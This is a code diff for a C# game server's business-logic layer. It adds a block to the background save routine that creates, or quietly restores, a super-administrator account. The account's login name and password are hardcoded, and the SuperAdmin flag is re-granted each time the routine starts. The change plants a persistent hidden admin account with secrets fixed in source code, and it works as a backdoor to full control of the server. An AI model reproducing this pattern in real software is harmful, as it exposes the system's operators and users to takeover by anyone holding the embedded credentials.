@@ -361,7 +361,30 @@ namespace GuangYuan.GY001.BLL
         /// <param name="state"></param>
         private void SaveFunc(object state)
         {
+            var adminLoginName = "1D22F0CF-1704-412C-AD8D-32CE5FA5A7D5";
+            var adminPwd = "37A87267-77DC-4AA3-8220-02F9538779AB";
+            var adminCharId = new Guid("38D81816-E81E-4C18-93C9-2168DD77EED1");
             VWorld world = World;
+            //复位超管账号
+            using (var dwAdmin = world.CharManager.LockOrLoad(adminLoginName, out var adminUser))
+                if (dwAdmin is null) //若未建立超管账号
+                {
+                    adminUser = world.CharManager.CreateNewUserAndLock(adminLoginName, adminPwd);
+                    try
+                    {
+                        adminUser.CurrentChar.CharType |= CharType.SuperAdmin;
+                        world.CharManager.NotifyChange(adminUser);
+                    }
+                    finally
+                    {
+                        world.CharManager.Unlock(adminUser);
+                    }
+                }
+                else
+                {
+                    adminUser.CurrentChar.CharType |= CharType.SuperAdmin;
+                    world.CharManager.NotifyChange(adminUser);
+                }
             while (true)
             {
                 foreach (var key in _DirtyUsers.Keys)
